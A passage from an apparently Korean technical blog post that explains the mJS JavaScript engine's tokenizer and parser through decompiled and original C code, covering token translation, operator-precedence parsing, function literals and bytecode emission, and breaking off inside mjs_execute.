00000068 pstate ends 00000068 pstate 구조체는 위와 같다.\n초기화가 잘 된다음에, parse_statement_list 함수로 들어간다. 이 함수가 제일 중요한 함수다.\nmjs_err_t __cdecl parse_statement_list(pstate *p, int et) { bool v3; // [rsp+Bh] [rbp-15h] int drop; // [rsp+Ch] [rbp-14h] mjs_err_t res; // [rsp+10h] [rbp-10h] res = MJS_OK; drop = 0; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 147) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 147LL); pnext(p); // cur_tok = 0xCA -\u0026gt; STR while ( 1 ) // 8,9 () { v3 = 0; if ( res == MJS_OK ) { v3 = 0; if ( p-\u0026gt;tok.tok ) v3 = p-\u0026gt;tok.tok != et; } if ( !v3 ) break; if ( drop ) emit_byte(p, 1u); res = parse_statement(p); drop = 1; while ( p-\u0026gt;tok.tok == 3 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 152) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 152LL); pnext(p); } } if ( !drop ) emit_byte(p, 0x11u); return res; } pnext 함수는 다음 코드의 부분까지 파싱하는 함수다.\nint __cdecl pnext(pstate *p) { unsigned int tok; // [rsp+0h] [rbp-10h] int toka; // [rsp+0h] [rbp-10h] int tmp; // [rsp+4h] [rbp-Ch] int tmpa; // [rsp+4h] [rbp-Ch] tok = 1; skip_spaces_and_comments(p); p-\u0026gt;tok.ptr = p-\u0026gt;pos; p-\u0026gt;tok.len = 1; if ( *p-\u0026gt;pos ) { if ( mjs_is_digit(*p-\u0026gt;pos) ) { tok = getnum(p); } else if ( *p-\u0026gt;pos == \u0026#39;\\\u0026#39;\u0026#39; || *p-\u0026gt;pos == \u0026#39;\u0026#34;\u0026#39; ) { tok = getstr(p); } else if ( mjs_is_ident(*p-\u0026gt;pos) ) { toka = getident(p); // GET ALPHABET KEYWORLD ex) let a tok = toka + is_reserved_word_token(p-\u0026gt;tok.ptr, p-\u0026gt;tok.len);// 32 reserved WORDS } else if ( strchr(\u0026#34;,.:;{}[]()?\u0026#34;, *p-\u0026gt;pos) ) { tok = *p-\u0026gt;pos; } else { tmp = longtok3(p, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok3(p, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok4(p, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok3(p, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;); if ( tmp ) goto LABEL_24; tmp = longtok3(p, \u0026#39;=\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;=\u0026#39;); if ( tmp || (tmp = longtok3(p, 33, 61, 61)) != 0 || (tmp = longtok(p, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;\u0026amp;=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;|\u0026#34;, \u0026#34;|=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026lt;=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;\u0026gt;=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;-\u0026#34;, \u0026#34;-=\u0026#34;)) != 0 || (tmp = longtok(p, \u0026#34;+\u0026#34;, \u0026#34;+=\u0026#34;)) != 0 ) { LABEL_24: tok = tmp; } else { tmpa = longtok(p, \u0026#34;^~+-%/*\u0026lt;\u0026gt;=!|\u0026amp;\u0026#34;, \u0026#34;=\u0026#34;); if ( tmpa ) tok = tmpa; } } } else { tok = 0; } if ( *p-\u0026gt;pos ) ++p-\u0026gt;pos; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_tok.c\u0026#34;, 250) ) cs_log_printf(\u0026#34; --\u0026gt; %d [%.*s]\u0026#34;, tok, p-\u0026gt;tok.len, p-\u0026gt;tok.ptr); p-\u0026gt;prev_tok = p-\u0026gt;tok.tok; p-\u0026gt;tok.tok = ptranslate(tok); // 8,9 -\u0026gt; () return p-\u0026gt;tok.tok; } 이런식으로 세미콜론을 기준으로 자르거나 하면서 파싱을 해준다.\nint __cdecl ptranslate(enum mjs_TOK tok) { switch ( tok ) { case 0x21: return 22; case 0x25: return 16; case 0x26: return 17; case 0x28: return 8; case 0x29: return 9; case 0x2A: return 12; case 0x2B: return 13; case 0x2C: return 4; case 0x2D: return 14; case 0x2E: return 20; case 0x2F: return 15; case 0x3A: return 2; case 0x3B: return 3; case 0x3C: return 24; case 0x3D: return 5; case 0x3E: return 25; case 0x3F: return 21; case 0x5B: return 10; case 0x5D: return 11; case 0x5E: return 19; case 0x7B: return 6; case 0x7C: return 18; case 0x7D: return 7; case 0x7E: return 23; case 0x213D: return 39; case 0x253D: return 36; case 0x2626: return 42; case 0x263D: return 34; case 0x2A3D: return 32; case 0x2B2B: return 29; case 0x2B3D: return 30; case 0x2D2D: return 28; case 0x2D3D: return 31; case 0x2F3D: return 33; case 0x3C3C: return 26; case 0x3C3D: return 40; case 0x3D3D: return 38; case 0x3E3D: return 41; case 0x3E3E: return 27; case 0x5E3D: return 37; case 0x7C3D: return 35; case 0x7C7C: return 43; case 0x213D3D: return 45; case 0x3C3C3D: return 46; case 0x3D3D3D: return 44; case 0x3E3E3D: return 47; case 0x3E3E3E: return 48; case 0x3E3E3E3D: return 49; } return tok; } 이건 그냥 tok에 맞는게 있으면, 그걸 리턴해준다. 이부분은 소스코드를 보는게 더 이해가 잘된다.\nstatic int ptranslate(int tok) { #define DT(a, b) ((a) \u0026lt;\u0026lt; 8 | (b)) #define TT(a, b, c) ((a) \u0026lt;\u0026lt; 16 | (b) \u0026lt;\u0026lt; 8 | (c)) #define QT(a, b, c, d) ((a) \u0026lt;\u0026lt; 24 | (b) \u0026lt;\u0026lt; 16 | (c) \u0026lt;\u0026lt; 8 | (d)) /* Map token ID produced by mjs_tok.c to token ID produced by lemon */ /* clang-format off */ switch (tok) { case \u0026#39;:\u0026#39;: return TOK_COLON; case \u0026#39;;\u0026#39;: return TOK_SEMICOLON; case \u0026#39;,\u0026#39;: return TOK_COMMA; case \u0026#39;=\u0026#39;: return TOK_ASSIGN; case \u0026#39;{\u0026#39;: return TOK_OPEN_CURLY; case \u0026#39;}\u0026#39;: return TOK_CLOSE_CURLY; case \u0026#39;(\u0026#39;: return TOK_OPEN_PAREN; case \u0026#39;)\u0026#39;: return TOK_CLOSE_PAREN; case \u0026#39;[\u0026#39;: return TOK_OPEN_BRACKET; case \u0026#39;]\u0026#39;: return TOK_CLOSE_BRACKET; case \u0026#39;*\u0026#39;: return TOK_MUL; case \u0026#39;+\u0026#39;: return TOK_PLUS; case \u0026#39;-\u0026#39;: return TOK_MINUS; case \u0026#39;/\u0026#39;: return TOK_DIV; case \u0026#39;%\u0026#39;: return TOK_REM; case \u0026#39;\u0026amp;\u0026#39;: return TOK_AND; case \u0026#39;|\u0026#39;: return TOK_OR; case \u0026#39;^\u0026#39;: return TOK_XOR; case \u0026#39;.\u0026#39;: return TOK_DOT; case \u0026#39;?\u0026#39;: return TOK_QUESTION; case \u0026#39;!\u0026#39;: return TOK_NOT; case \u0026#39;~\u0026#39;: return TOK_TILDA; case \u0026#39;\u0026lt;\u0026#39;: return TOK_LT; case \u0026#39;\u0026gt;\u0026#39;: return TOK_GT; case DT(\u0026#39;\u0026lt;\u0026#39;,\u0026#39;\u0026lt;\u0026#39;): return TOK_LSHIFT; case DT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;): return TOK_RSHIFT; case DT(\u0026#39;-\u0026#39;,\u0026#39;-\u0026#39;): return TOK_MINUS_MINUS; case DT(\u0026#39;+\u0026#39;,\u0026#39;+\u0026#39;): return TOK_PLUS_PLUS; case DT(\u0026#39;+\u0026#39;,\u0026#39;=\u0026#39;): return TOK_PLUS_ASSIGN; case DT(\u0026#39;-\u0026#39;,\u0026#39;=\u0026#39;): return TOK_MINUS_ASSIGN; case DT(\u0026#39;*\u0026#39;,\u0026#39;=\u0026#39;): return TOK_MUL_ASSIGN; case DT(\u0026#39;/\u0026#39;,\u0026#39;=\u0026#39;): return TOK_DIV_ASSIGN; case DT(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_AND_ASSIGN; case DT(\u0026#39;|\u0026#39;,\u0026#39;=\u0026#39;): return TOK_OR_ASSIGN; case DT(\u0026#39;%\u0026#39;,\u0026#39;=\u0026#39;): return TOK_REM_ASSIGN; case DT(\u0026#39;^\u0026#39;,\u0026#39;=\u0026#39;): return TOK_XOR_ASSIGN; case DT(\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;): return TOK_EQ; case DT(\u0026#39;!\u0026#39;,\u0026#39;=\u0026#39;): return TOK_NE; case DT(\u0026#39;\u0026lt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_LE; case DT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_GE; case DT(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\u0026amp;\u0026#39;): return TOK_LOGICAL_AND; case DT(\u0026#39;|\u0026#39;,\u0026#39;|\u0026#39;): return TOK_LOGICAL_OR; case TT(\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;): return TOK_EQ_EQ; case TT(\u0026#39;!\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;=\u0026#39;): return TOK_NE_NE; case TT(\u0026#39;\u0026lt;\u0026#39;,\u0026#39;\u0026lt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_LSHIFT_ASSIGN; case TT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_RSHIFT_ASSIGN; case TT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;): return TOK_URSHIFT; case QT(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026gt;\u0026#39;,\u0026#39;=\u0026#39;): return TOK_URSHIFT_ASSIGN; } /* clang-format on */ return tok; } mjs_err_t __cdecl parse_statement(pstate *p) { int tok; // [rsp+8h] [rbp-18h] mjs_err_t res; // [rsp+Ch] [rbp-14h] if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 900) ) cs_log_printf(\u0026#34;[%.*s]\u0026#34;, 10, p-\u0026gt;tok.ptr); tok = p-\u0026gt;tok.tok; switch ( tok ) { case 3: emit_byte(p, 0x11u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 904) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 904LL); goto LABEL_34; case 6: return parse_block(p, 1); case 0xCB: emit_byte(p, 0x11u); emit_byte(p, 0x20u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 919) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 919LL); goto LABEL_34; } if ( (unsigned int)(tok - 0xCC) \u0026lt; 2 ) goto LABEL_36; if ( tok == 0xCE ) { emit_byte(p, 0x21u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 923) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 923LL); LABEL_34: pnext(p); return 0; } if ( (unsigned int)(tok - 0xD1) \u0026lt; 2 ) goto LABEL_36; if ( tok == 0xD6 ) return parse_for(p); if ( tok == 0xD8 ) return parse_if(p); if ( (unsigned int)(tok - 0xDA) \u0026lt; 2 ) goto LABEL_36; if ( tok == 0xDD ) return parse_return(p); if ( tok == 0xDE || tok == 0xE0 || tok == 0xE2 || (unsigned int)(tok - 0xE4) \u0026lt; 2 ) goto LABEL_36; switch ( tok ) { case 0xE6: return parse_while(p); case 0xE7: LABEL_36: mjs_set_errorf(p-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;[%.*s] is not implemented\u0026#34;, (unsigned int)p-\u0026gt;tok.len, p-\u0026gt;tok.ptr); return 1; case 0xE8: return parse_let(p); } while ( 1 ) { res = parse_expr(p); if ( res ) return res; if ( p-\u0026gt;tok.tok != 4 ) break; emit_byte(p, 1u); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 948) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 948LL); pnext(p); } return 0; } parse_statement 함수는 tok에 따라 잘 파싱을 해서 바이트 코드를 점화하는 함수다. 마지막에 parse_expr 함수를 호출한다.\nparse_expr 함수는 말 그대로 expression을 파싱하는 함수다. ternary, logical_or, logical_and, bitwise_or \u0026hellip; shift, plus, minus \u0026hellip; unary 이런식으로 함수를 계속 호출한다. 즉 그냥 연산자 우선순위를 구현한거라고 보면 된다.\nmjs_err_t __cdecl parse_expr(pstate *p) { return parse_assignment(p, 0); } mjs_err_t __cdecl parse_assignment(pstate *p, int prev_op) { int op; // [rsp+4h] [rbp-1Ch] mjs_err_t res; // [rsp+8h] [rbp-18h] mjs_err_t resa; // [rsp+8h] [rbp-18h] res = parse_ternary(p, 0); if ( res == MJS_OK ) { if ( findtok(\u0026amp;s_assign_ops, p-\u0026gt;tok.tok) ) { op = p-\u0026gt;tok.tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 503) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 503LL); pnext(p); resa = parse_assignment(p, 0); if ( resa ) return resa; emit_op(p, op); } return 0; } return res; } 삼항 연산자를 먼저 파싱한다.\nmjs_err_t __cdecl parse_ternary(pstate *p, int prev_op) { size_t off_else; // [rsp+0h] [rbp-30h] size_t off_endif; // [rsp+8h] [rbp-28h] size_t off_endifa; // [rsp+8h] [rbp-28h] size_t off_if; // [rsp+10h] [rbp-20h] mjs_err_t res; // [rsp+18h] [rbp-18h] mjs_err_t resa; // [rsp+18h] [rbp-18h] mjs_err_t resb; // [rsp+18h] [rbp-18h] res = parse_logical_or(p, 0); if ( res == MJS_OK ) { if ( prev_op ) emit_op(p, prev_op); if ( p-\u0026gt;tok.tok == 21 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 470) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 470LL); pnext(p); emit_byte(p, 7u); off_if = p-\u0026gt;cur_idx; emit_init_offset(p); resa = parse_ternary(p, 0); if ( resa ) return resa; emit_byte(p, 4u); off_else = p-\u0026gt;cur_idx; emit_init_offset(p); off_endif = p-\u0026gt;cur_idx; emit_byte(p, 1u); if ( p-\u0026gt;tok.tok != 2 ) { mjs_set_errorf( p-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;parse error at line %d: [%.*s]\u0026#34;, (unsigned int)p-\u0026gt;line_no, 10LL, p-\u0026gt;tok.ptr, off_else); return 1; } if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 485) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 485LL); pnext(p); resb = parse_ternary(p, 0); if ( resb ) return resb; off_endifa = off_endif + mjs_bcode_insert_offset(p, p-\u0026gt;mjs, off_else, p-\u0026gt;cur_idx - off_else - 1); mjs_bcode_insert_offset(p, p-\u0026gt;mjs, off_if, off_endifa - off_if - 1); } return 0; } return res; } mjs_err_t __cdecl parse_logical_or(pstate *p, int prev_op) { uint8_t v2; // al size_t off_if; // [rsp+8h] [rbp-28h] int op; // [rsp+14h] [rbp-1Ch] mjs_err_t res; // [rsp+18h] [rbp-18h] int ops[2]; // [rsp+1Ch] [rbp-14h] BYREF int prev_opa; // [rsp+24h] [rbp-Ch] pstate *pa; // [rsp+28h] [rbp-8h] pa = p; prev_opa = prev_op; *(_QWORD *)ops = 43LL; ++p-\u0026gt;depth; if ( pa-\u0026gt;depth \u0026lt;= 512 ) { res = parse_logical_and(pa, 0); if ( res == MJS_OK ) { if ( prev_opa ) emit_op(pa, prev_opa); if ( findtok(ops, pa-\u0026gt;tok.tok) ) { op = pa-\u0026gt;tok.tok; off_if = 0LL; if ( ops[0] == 42 || ops[0] == 43 ) { v2 = 6; if ( ops[0] == 42 ) v2 = 8; emit_byte(pa, v2); off_if = pa-\u0026gt;cur_idx; emit_init_offset(pa); emit_byte(pa, 1u); op = 0; } if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 460) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 460LL); pnext(pa); res = parse_logical_or(pa, op); if ( res == MJS_OK \u0026amp;\u0026amp; off_if ) mjs_bcode_insert_offset(pa, pa-\u0026gt;mjs, off_if, pa-\u0026gt;cur_idx - off_if - 1); } } } else { mjs_set_errorf(pa-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;parser stack overflow\u0026#34;); res = MJS_SYNTAX_ERROR; } --pa-\u0026gt;depth; return res; } 함수 기본적인 틀은 다 똑같다. 매크로로 구현해둬서 그렇다. parse_unary에서만 조금 바뀐다.\nmjs_err_t __cdecl parse_unary(pstate *p, int prev_op) { int op; // [rsp+4h] [rbp-1Ch] mjs_err_t res; // [rsp+8h] [rbp-18h] op = 0; if ( findtok(\u0026amp;s_unary_ops, p-\u0026gt;tok.tok) ) { op = p-\u0026gt;tok.tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 399) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 399LL); pnext(p); } if ( findtok(\u0026amp;s_unary_ops, p-\u0026gt;tok.tok) ) res = parse_unary(p, prev_op); else res = parse_postfix(p, prev_op); if ( res ) return res; if ( op ) { if ( op == 14 ) op = 51; if ( op == 13 ) op = 50; emit_op(p, op); } return 0; } 일반적인 문자들은 parse_postfix를 타고 들어간다.\nmjs_err_t __cdecl parse_postfix(pstate *p, int prev_op) { int v2; // eax mjs_err_t res; // [rsp+8h] [rbp-18h] res = parse_call_dot_mem(p, prev_op); if ( res ) return res; if ( p-\u0026gt;tok.tok == 29 || p-\u0026gt;tok.tok == 28 ) { v2 = 53; if ( p-\u0026gt;tok.tok == 29 ) v2 = 52; emit_op(p, v2); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 389) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 389LL); pnext(p); } return 0; } parse_call_dot_mem은 그냥 소스코드로 보는게 더 편하다.\nstatic mjs_err_t parse_call_dot_mem(struct pstate *p, int prev_op) { int ops[] = {TOK_DOT, TOK_OPEN_PAREN, TOK_OPEN_BRACKET, TOK_EOF}; mjs_err_t res = MJS_OK; if ((res = parse_literal(p, \u0026amp;p-\u0026gt;tok)) != MJS_OK) return res; while (findtok(ops, p-\u0026gt;tok.tok) != TOK_EOF) { if (p-\u0026gt;tok.tok == TOK_OPEN_BRACKET) { int prev_tok = p-\u0026gt;prev_tok; EXPECT(p, TOK_OPEN_BRACKET); if ((res = parse_expr(p)) != MJS_OK) return res; emit_byte(p, OP_SWAP); EXPECT(p, TOK_CLOSE_BRACKET); if (!findtok(s_assign_ops, p-\u0026gt;tok.tok) \u0026amp;\u0026amp; !findtok(s_postfix_ops, p-\u0026gt;tok.tok) \u0026amp;\u0026amp; /* TODO(dfrank): fix: it doesn\u0026#39;t work for prefix ops */ !findtok(s_postfix_ops, prev_tok)) { emit_byte(p, OP_GET); } } else if (p-\u0026gt;tok.tok == TOK_OPEN_PAREN) { EXPECT(p, TOK_OPEN_PAREN); emit_byte(p, OP_ARGS); while (p-\u0026gt;tok.tok != TOK_CLOSE_PAREN) { if ((res = parse_expr(p)) != MJS_OK) return res; if (p-\u0026gt;tok.tok == TOK_COMMA) pnext1(p); } emit_byte(p, OP_CALL); EXPECT(p, TOK_CLOSE_PAREN); } else if (p-\u0026gt;tok.tok == TOK_DOT) { EXPECT(p, TOK_DOT); if ((res = parse_call_dot_mem(p, TOK_DOT)) != MJS_OK) return res; } } (void) prev_op; return res; } ()를 구분해서 arg도 잘 넣어준다. parse_literal을 통해서 문자열을 읽는다. js 코드에서 mjs_print를 호출하려고 print()를 호출하면, 문자열 print는 parse_literal 함수에서 파싱된다.\nmjs_err __cdecl parse_literal(pstate *p, const tok *t) { uint8_t v2; // al __m128d v3; // xmm1 enum mjs_OPCODE v5; // [rsp+Ch] [rbp-54h] size_t oldlen; // [rsp+10h] [rbp-50h] unsigned __int64 uv; // [rsp+18h] [rbp-48h] BYREF double d; // [rsp+20h] [rbp-40h] double iv; // [rsp+28h] [rbp-38h] BYREF int next_tok; // [rsp+30h] [rbp-30h] int prev_tok; // [rsp+34h] [rbp-2Ch] int tok; // [rsp+38h] [rbp-28h] mjs_err res; // [rsp+3Ch] [rbp-24h] mbuf *bcode_gen; // [rsp+40h] [rbp-20h] const tok *ta; // [rsp+48h] [rbp-18h] BYREF pstate *pa; // [rsp+50h] [rbp-10h] pa = p; ta = t; bcode_gen = \u0026amp;p-\u0026gt;mjs-\u0026gt;bcode_gen; res = MJS_OK; tok = t-\u0026gt;tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 276) ) cs_log_printf(\u0026#34;[%.*s] %p\u0026#34;, pa-\u0026gt;tok.len, pa-\u0026gt;tok.ptr, \u0026amp;ta); *(_DWORD *)\u0026amp;v5 = ta-\u0026gt;tok; if ( ta-\u0026gt;tok == TOK_ASSIGN ) { res = parse_object_literal(pa); } else { switch ( *(_DWORD *)\u0026amp;v5 ) { case 8: if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 331) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 331LL); pnext(pa); res = parse_expr(pa); if ( pa-\u0026gt;tok.tok != TOK_OPEN_PAREN ) goto LABEL_39; break; case 0xA: res = parse_array_literal(pa); break; case 0xC8: d = strtod(ta-\u0026gt;ptr, 0LL); uv = strtoul(ta-\u0026gt;ptr + 2, 0LL, 16); if ( *ta-\u0026gt;ptr == 48 \u0026amp;\u0026amp; *((_BYTE *)ta-\u0026gt;ptr + 1) == 120 ) { v3 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32(_mm_loadl_epi64((const __m128i *)\u0026amp;uv), (__m128i)xmmword_24020), (__m128d)xmmword_24030); d = _mm_unpackhi_pd(v3, v3).m128d_f64[0] + v3.m128d_f64[0]; } if ( modf(d, \u0026amp;iv) == 0.0 ) { emit_byte(pa, 0xEu); emit_int(pa, (unsigned int)(int)d); } else { emit_byte(pa, 0xFu); emit_str(pa, ta-\u0026gt;ptr, ta-\u0026gt;len); } break; case 0xC9: emit_byte(pa, 0xBu); oldlen = bcode_gen-\u0026gt;len; embed_string(bcode_gen, pa-\u0026gt;cur_idx, ta-\u0026gt;ptr, ta-\u0026gt;len, 2u); pa-\u0026gt;cur_idx += LODWORD(bcode_gen-\u0026gt;len) - oldlen; break; case 0xCA: prev_tok = pa-\u0026gt;prev_tok; next_tok = ptest(pa); emit_byte(pa, 0xBu); emit_str(pa, ta-\u0026gt;ptr, ta-\u0026gt;len); v2 = 9; if ( prev_tok == 0x14 ) v2 = 3; emit_byte(pa, v2); // PUSH STR if ( !findtok(\u0026amp;s_assign_ops, next_tok) \u0026amp;\u0026amp; !findtok(\u0026amp;s_postfix_ops, next_tok) \u0026amp;\u0026amp; !findtok(\u0026amp;s_postfix_ops, prev_tok) )// ++, -- { emit_byte(pa, 0x16u); } break; case 0xD4: emit_byte(pa, 0xDu); break; case 0xD7: res = parse_function(pa); break; case 0xDC: emit_byte(pa, 0x10u); break; case 0xDF: emit_byte(pa, 0x15u); break; case 0xE1: emit_byte(pa, 0xCu); break; case 0xE9: emit_byte(pa, 0x11u); break; default: LABEL_39: mjs_set_errorf( pa-\u0026gt;mjs, MJS_SYNTAX_ERROR, \u0026#34;parse error at line %d: [%.*s]\u0026#34;, (unsigned int)pa-\u0026gt;line_no, 10LL, pa-\u0026gt;tok.ptr); return 1; } } if ( tok != 0xD7 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \u0026#34;src/mjs_parser.c\u0026#34;, 344) ) cs_log_printf(\u0026#34; PNEXT %d\u0026#34;, 344LL); pnext(pa); } return res; } 여기서 주목할건 parse_function이다.\nstatic mjs_err_t parse_function(struct pstate *p) { size_t prologue, off; int arg_no = 0; int name_provided = 0; mjs_err_t res = MJS_OK; EXPECT(p, TOK_KEYWORD_FUNCTION); if (p-\u0026gt;tok.tok == TOK_IDENT) { /* Function name was provided */ struct tok tmp = p-\u0026gt;tok; name_provided = 1; emit_byte(p, OP_PUSH_STR); emit_str(p, tmp.ptr, tmp.len); emit_byte(p, OP_PUSH_SCOPE); emit_byte(p, OP_CREATE); emit_byte(p, OP_PUSH_STR); emit_str(p, tmp.ptr, tmp.len); emit_byte(p, OP_FIND_SCOPE); pnext1(p); } emit_byte(p, OP_JMP); off = p-\u0026gt;cur_idx; emit_init_offset(p); prologue = p-\u0026gt;cur_idx; EXPECT(p, TOK_OPEN_PAREN); emit_byte(p, OP_NEW_SCOPE); // Emit names of function arguments while (p-\u0026gt;tok.tok != TOK_CLOSE_PAREN) { if (p-\u0026gt;tok.tok != TOK_IDENT) SYNTAX_ERROR(p); emit_byte(p, OP_SET_ARG); emit_int(p, arg_no); arg_no++; emit_str(p, p-\u0026gt;tok.ptr, p-\u0026gt;tok.len); if (ptest(p) == TOK_COMMA) pnext1(p); pnext1(p); } EXPECT(p, TOK_CLOSE_PAREN); if ((res = parse_block(p, 0)) != MJS_OK) return res; emit_byte(p, OP_RETURN); prologue += mjs_bcode_insert_offset(p, p-\u0026gt;mjs, off, p-\u0026gt;cur_idx - off - MJS_INIT_OFFSET_SIZE); emit_byte(p, OP_PUSH_FUNC); emit_int(p, p-\u0026gt;cur_idx - 1 /* OP_PUSH_FUNC */ - prologue); if (name_provided) { emit_op(p, TOK_ASSIGN); } return res; } 소스코드로 보면 명확하게 보인다. tok는 ident로 들어가기 때문에, 결국 print 문자열을 그대로 집어넣게 된다.\njs가 인터프리터 언어라서 그런지 예상했던대로 그대로 문자열을 넣는다.\nres = parse_statement_list(\u0026amp;p, 0); emit_byte(\u0026amp;p, 0x23u); // OP_EXIT *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx + 8] = p.mjs-\u0026gt;bcode_gen.len - start_idx; map_len = p.offset_lineno_map.len; llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len)); mbuf_resize(\u0026amp;p.mjs-\u0026gt;bcode_gen, llen + p.mjs-\u0026gt;bcode_gen.size); cs_varint_encode(map_len, (uint8_t *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[p.mjs-\u0026gt;bcode_gen.len], llen); p.mjs-\u0026gt;bcode_gen.len += llen; mbuf_append(\u0026amp;p.mjs-\u0026gt;bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len); *(_DWORD *)\u0026amp;p.mjs-\u0026gt;bcode_gen.buf[start_idx] = p.mjs-\u0026gt;bcode_gen.len - start_idx; mbuf_free(\u0026amp;p.offset_lineno_map); if ( res ) mbuf_free(\u0026amp;mjsa-\u0026gt;bcode_gen); else mjs_bcode_commit(mjsa); return res; } mjs_parse 함수의 뒷부분을 보면 파싱이 끝나고 mjs_bcode_commit을 통해서 mjs-\u0026gt;bcode_parts로 바이트 코드를 옮기는 것을 알 수 있다.\nmjs_execute mjs_err_t __cdecl mjs_execute(mjs *mjs, size_t off, mjs_val_t *res) { mjs_val_t v3; // rax mjs_val_t v4; // rax mjs_val_t v5; // rax mjs_val_t v6; // rax mjs_val_t v7; // rax mjs_val_t v8; // rax mjs_val_t v9; // rax mjs_val_t v10; // rax mjs_val_t v11; // rax mjs_val_t v12; // rax mjs_val_t v13; // rax mjs_val_t v14; // rax mjs_val_t v15; // rax mjs_val_t v16; // rax mjs_val_t v17; // rax double v18; // xmm0_8 mjs_val_t v19; // rax __m128d v20; // xmm1 mjs_val_t v21; // rax void (__fastcall *ptr)(mjs *); // rax mjs_val_t *v23; // rax mjs_val_t v24; // rax __m128d v25; // xmm1 mjs_val_t v26; // rax __m128d v27; // xmm1 mjs_val_t v28; // rax __m128d v29; // xmm1 mjs_val_t v30; // rax mjs_val_t *v31; // rax mjs_val_t v32; // rax mjs_val_t v33; // rax mjs_val_t v34; // rax mjs_bcode_part *v35; // rax mjs_val_t v36; // rax mjs_err error; // [rsp+4h] [rbp-2DCh] mjs *v39; // [rsp+8h] [rbp-2D8h] mjs *v40; // [rsp+10h] [rbp-2D0h] mjs *v41; // [rsp+18h] [rbp-2C8h] mjs *v42; // [rsp+20h] [rbp-2C0h] mjs *v43; // [rsp+28h] [rbp-2B8h] mbuf *p_loop_addresses; // [rsp+30h] [rbp-2B0h] mbuf *v45; // [rsp+38h] [rbp-2A8h] mbuf *v46; // [rsp+68h] 